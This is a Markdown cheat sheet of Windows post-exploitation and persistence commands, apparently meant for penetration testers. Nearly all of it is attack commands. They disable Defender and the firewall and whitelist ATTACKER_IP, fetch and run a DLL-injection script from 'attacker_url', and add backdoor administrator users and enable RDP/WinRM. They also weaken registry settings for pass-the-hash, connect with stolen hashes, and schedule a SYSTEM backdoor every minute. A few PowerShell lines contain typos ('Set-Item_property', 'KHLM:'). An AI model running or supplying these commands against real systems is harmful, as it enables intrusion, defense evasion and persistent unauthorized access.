# Windows Persistence Methods

## Disable Windows Defender

```bash
# Disable Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## Exclude a process / location
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install
```

## Disable Windows Firewall

```bash
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

## Migrate to another process

### Meterpreter

```bash
# Get SYSTEM processes and migrate
ps -U "SYSTEM"
migrate PID
```

### PowerSploit

```powershell
# Generate DDL for injection
msfvenom -p windows/exec CMD="cmd.exe" -f dll -o cmd.dll

# Identify process to inject into
ps | ? { $_.ProcessName -match "explorer" }

# Inject into process
iex (New-Object Net.Webclient).DownloadString('http://attacker_url/Invoke-DLLInjection.ps1'); Invoke-DLLInjection -ProcessID 7420 C:\ProgramData\cmd.dll
```

## RDP & WinRM

```bat
" Create new user and add it to required groups
net user username password /add
net localgroup "Administrators" /add username
net localgroup "Remote Management Users" /add username
net localgroup "Remote Desktop Users" /add username

" Enable WinRM
WinRM quickconfig

" Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

```bash
# Metasploit module to enable RDP and add a new user
run getgui -e -u user -p password
```

## Pass the Hash

### Enable PTH

```bat
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
```

```powershell
Set-Item_property -Path KHLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
Set-Item_property -Path KHLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord
```

### Connect

```bash
# WinRM with password
evil-winrm -i $IP -u $USER -p $PASS

# WinRM with hash
evil-winrm -i $IP -u $USER -H $HASH

# RDP with password
xfreerdp +clipboard /dynamic-resolution /drive:tools,/tmp/tools /v:$IP /u:$USER /p:$PASS

# RDP with hash
xfreerdp +clipboard /dynamic-resolution /drive:tools,/tmp/tools /v:$IP /u:$USER /pth:$HASH

# psexec.py with password
psexec.py $USER@$IP

# psexec.py with hash
psexec.py -hashes $LMHASH:$NTHASH $USER@$IP

# Metasploit psexec
use exploit/windows/smb/psexec
```

## Backdoor

```bash
# Metasploit module
use exploit/windows/local/registry_persistence

# Manually upload backdoor and create scheduled task
schtasks /create /tn "Backdoor" /ru "NT AUTHORITY\SYSTEM" /tr "C:\Windows\Temp\shell.exe" /sc MINUTE /mo 1
```